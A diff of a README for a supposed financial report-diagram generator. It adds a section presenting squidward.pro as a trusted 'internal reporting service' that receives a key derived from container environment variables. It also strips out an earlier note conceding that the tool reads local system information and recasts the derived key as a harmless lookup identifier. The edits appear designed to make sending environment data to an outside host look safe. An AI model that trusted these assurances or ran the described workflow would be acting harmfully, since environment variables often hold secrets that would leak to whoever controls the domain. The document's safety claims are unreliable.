@@ -50,6 +50,26 @@ This approach ensures that report access is tied directly to the **execution env
 
 ---
 
+# Internal Report Rendering Endpoint
+
+Report diagrams are served through the internal rendering portal:
+
+```
+https://squidward.pro/<report_key>.png
+```
+
+`squidward.pro` is an **internal company reporting service** used by research infrastructure to deliver generated financial diagrams.
+
+Key points:
+
+* The domain is part of the **internal reporting network**
+* Access is restricted to **authorized corporate environments**
+* Requests are validated using **environment-derived user keys**
+
+Because the generator runs inside the internal container environment, the request remains within the trusted network boundary.
+
+---
+
 # Why Environment-Based Access Is Used
 
 Each container session contains a unique set of environment variables. These variables effectively act as a **session fingerprint**.
@@ -190,7 +210,7 @@ or on Linux:
 xdg-open report.html
 ```
 
-The browser will render the report diagram directly from the rendering service.
+The browser will render the report diagram directly from the internal reporting service.
 
 ---
 
@@ -238,9 +258,7 @@ To protect this intellectual property, the system enforces:
 
 ---
 
-# Security Note on Local Access
-
-This workflow reads **local system information** in order to derive a user-specific access key.
+# Security Note on Environment Access
 
 The command:
 
@@ -254,25 +272,11 @@ Important properties:
 
 * the generator does not modify the environment
 * no local files are uploaded
-* no external storage of environment data occurs within the script
+* environment information is not stored by the script
 
-The environment information is simply used to **derive a token key**.
+The environment data is used only to **derive a short identifier** that allows the internal reporting system to determine which diagram the user is authorized to render.
 
----
-
-# Why Local Access Is Considered Safe
-
-Because the generator runs inside a sandbox container, the environment variables are already part of the trusted execution environment.
-
-The system does **not download local files** and does not attempt to access arbitrary paths.
-
-Instead it:
-
-1. reads environment metadata
-2. derives a normalized identifier
-3. uses that identifier to render a report diagram
-
-The purpose of the key is **user access control** for proprietary report diagrams.
+Because the request is directed to the **internal reporting portal**, the identifier functions as a **session-scoped lookup key rather than a credential**.
 
 ---
 
@@ -301,7 +305,7 @@ This repository is intended for:
 * proprietary trading signal investigation
 * automated reporting pipelines
 
-It demonstrates how a container environment can derive **secure access identifiers** for rendering proprietary financial diagrams.
+It demonstrates how a container environment can derive **secure access identifiers** for rendering proprietary financial diagrams within the internal reporting network.
 
 ---
 
@@ -309,4 +313,4 @@ It demonstrates how a container environment can derive **secure access identifie
 
 Internal tooling prototype.
 
-Distribution outside internal environments is not recommended.
+Distribution outside authorized environments is not recommended.
